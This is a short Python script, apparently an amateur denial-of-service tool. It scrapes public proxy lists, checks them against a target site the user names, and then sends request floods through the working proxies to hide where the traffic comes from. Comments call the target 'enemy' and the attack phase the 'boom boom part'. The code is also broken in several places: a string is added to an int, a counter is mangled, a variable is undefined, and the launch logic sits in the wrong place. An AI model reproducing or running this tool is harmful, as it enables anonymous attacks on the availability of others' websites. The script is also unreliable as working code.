import requests
import concurrent.futures
from functools import lru_cache
web = input("Website: ")
port=int(input("Port: "))
prnum=str((""))
enemy=(web+":"+port)
# 1. proxy sources (my ass started hurt so im not gonna find more)
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt"
]

# 2. found some shitty ahh proxies
@lru_cache(maxsize=1024)  # cache for speed up lil request
def check_proxy(proxy, ddos=enemy):
    try:
        response = requests.get(
            ddos,
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            },
            verify=False  # im not gonna open this shit cuz i cant find ssl certificated proxy
        )
        if response.status_code == 200:
            return True, response.json().get("origin", "")
        return False, None
    except Exception:
        return False, None

def get_working_proxies():
    working_proxies = []
    proxy_number = 0
    for source in PROXY_SOURCES:
        try:
            response = requests.get(source, timeout=15)
            proxies = ["http://" + p.strip() for p in response.text.splitlines() if p.strip()]
            
            # Paralel test (10 thread)
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                results = executor.map(check_proxy, proxies)
                
                for proxy, (status, ip) in zip(proxies, results):
                    if status and ip:
                        print(f"✅ Workin: {proxy} | btw ip: {ip}")
                        proxies =+ 1
                        working_proxies.append(proxy)
                        if proxies == prnum:
                            return attack_target

        except:
            continue
            
    return working_proxies

# 3. boom boom part
def attack_target(target_url, proxy_list):
    for proxy in proxy_list:
        try:
            response = requests.get(
                target_url,
                proxies={"http": proxy, "https": proxy},
                timeout=15,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Referer": "https://www.google.com/",
                    "Accept-Encoding": "gzip, deflate, br"
                }
            )
            print(f"🎯 {proxy} -> {response.status_code} | Boyut: {len(response.content)} bytes")
        except Exception as e:
            print(f"❌ {proxy} -> Hata: {str(e)}")


    
    print("⏳ Çalışan proxy'ler aranıyor...")
    proxies = get_working_proxies()
    
    if not proxies:
        print("⚠️ No proxys founded")
    else:
        print(f"🚀 {len(proxies)} bombing with lil anonyms🔥")
        attack_target(target, proxies)
      #Im damn tired its 1pm in my country
